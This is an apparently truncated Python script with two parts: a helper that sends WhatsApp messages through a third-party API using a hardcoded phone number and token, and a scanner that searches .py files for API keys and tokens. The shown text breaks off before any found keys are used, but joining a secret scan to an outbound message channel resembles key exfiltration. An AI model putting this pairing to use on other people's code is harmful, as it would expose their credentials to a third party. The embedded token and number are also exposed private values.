import os
import re
import requests

WHATSAPP_NUMBER = "918600609295"
INSTANCE_ID = "instance126727"
TOKEN = "2nmo6sl5l4ry94le"

def send_whatsapp_message(number, message):
 url = f"https://api.ultramsg.com/{INSTANCE_ID}/messages/chat"
 payload = {"token": TOKEN, "to": number, "body": message}
 try:
  res = requests.post(url, data=payload)
  print("Message sent:", res.json())
 except Exception as e:
  print("Error sending WhatsApp message:", e)

def scan_code_for_keys(folder="."):
 keywords = ["api_key", "access_token", "client_id", "secret_key", "authorization", "bearer_token", "openai.api_key", "token"]
 key_usage = {}
 for root, dirs, files in os.walk(folder):
  for file in files:
   if file.endswith(".py"):
    path = os.path.join(root, file)
    try:
     with open(path, "r", encoding="utf-8", errors="ignore") as f:
      lines = f.readlines()
      for line in lines:
       for kw in keywords:
        if kw in line:
         pattern = r"{}.*?[=:
